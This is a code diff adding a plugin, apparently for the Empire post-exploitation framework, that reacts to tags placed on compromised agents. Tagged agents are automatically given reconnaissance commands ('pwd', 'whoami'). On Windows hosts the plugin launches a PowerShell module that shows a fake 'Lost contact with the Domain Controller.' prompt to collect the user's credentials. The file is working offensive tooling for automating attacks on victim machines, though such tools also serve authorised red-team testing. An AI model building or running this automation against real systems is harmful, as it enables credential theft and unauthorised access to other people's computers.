@@ -1,0 +1,93 @@
+import logging
+
+from empire.server.api.v2.agent.agent_task_dto import ModulePostRequest
+from empire.server.api.v2.tag.tag_dto import TagRequest
+from empire.server.common.empire import MainMenu
+from empire.server.common.plugins import Plugin
+from empire.server.core.agent_task_service import AgentTaskService
+from empire.server.core.db import models
+from empire.server.core.db.models import PluginTaskStatus
+from empire.server.core.hooks import hooks
+from empire.server.core.module_service import ModuleService
+from empire.server.core.tag_service import TagService
+
+log = logging.getLogger(__name__)
+
+
+class Plugin(Plugin):
+    def onLoad(self):
+        self.info = {
+            # Plugin Name, at the moment this much match the do_ command
+            "Name": "preplanned_tasks",
+            # List of one or more authors for the plugin
+            "Authors": [
+                {
+                    "Name": "Vince Rose",
+                    "Handle": "@vinnybod",
+                    "Link": "https://github.com/vinnybod",
+                }
+            ],
+            "Description": (""),
+            "Software": "SXXXX",
+            "Techniques": ["TXXXX", "TXXXX"],
+            "Comments": [],
+        }
+        self.options = {}
+
+        hooks.register_hook(hooks.AFTER_TAG_CREATED_HOOK, 'preplanned_tasks_4', self.tag_created)
+
+    def register(self, mainMenu):
+        self.installPath = mainMenu.installPath
+        self.main_menu: MainMenu = mainMenu
+        self.agent_task_service: AgentTaskService = self.main_menu.agenttasksv2
+        self.module_service: ModuleService = self.main_menu.modulesv2
+        self.tag_service: TagService = self.main_menu.tagsv2
+
+    def tag_created(self, db, tag, taggable):
+        taggable_type = type(taggable).__name__
+        log.info(f"Tag created: {tag.name}:{tag.value} on {taggable_type}")
+
+        if not isinstance(taggable, models.Agent):
+            return
+
+        log.info(f"Tag is on an agent: {taggable.name}")
+
+        if not tag.name == "preplanned_task":
+            return
+
+        log.info(f"Tag is a preplanned task: {tag.value}")
+
+        plugin_task = models.PluginTask(
+            plugin_id='preplanned_tasks',
+            input=f'Executing preplanned task plugin on agent {taggable.name}',
+            input_full=f'Executing preplanned task plugin on agent {taggable.name}',
+            output = '',
+            status=PluginTaskStatus.completed
+        )
+        tag_req = TagRequest(name='plugin', value='preplanned')
+
+        task, _ = self.agent_task_service.create_task_shell(db, taggable, 'pwd')
+        self.tag_service.add_tag(db, task, tag_req)
+        plugin_task.output += f"Executed pwd on agent {taggable.name}\n"
+
+        task, _ = self.agent_task_service.create_task_shell(db, taggable, 'whoami')
+        self.tag_service.add_tag(db, task, tag_req)
+        plugin_task.output += f"Executed whoami on agent {taggable.name}\n"
+
+        if 'windows' in taggable.os_details.lower():
+            plugin_task.output += f"Agent {taggable.name} is a windows agent\n"
+            module_req = ModulePostRequest(
+                module_id='powershell_collection_prompt',
+                options={'MsgTxt': 'Lost contact with the Domain Controller.'}
+            )
+            task, _ = self.agent_task_service.create_task_module(db, taggable, module_req)
+            self.tag_service.add_tag(db, task, tag_req)
+            plugin_task.output += f"Executed powershell_collection_prompt on agent {taggable.name}\n"
+
+        db.add(plugin_task)
+
+    def execute(self, command):
+        return True
+
+    def shutdown(self):
+        pass
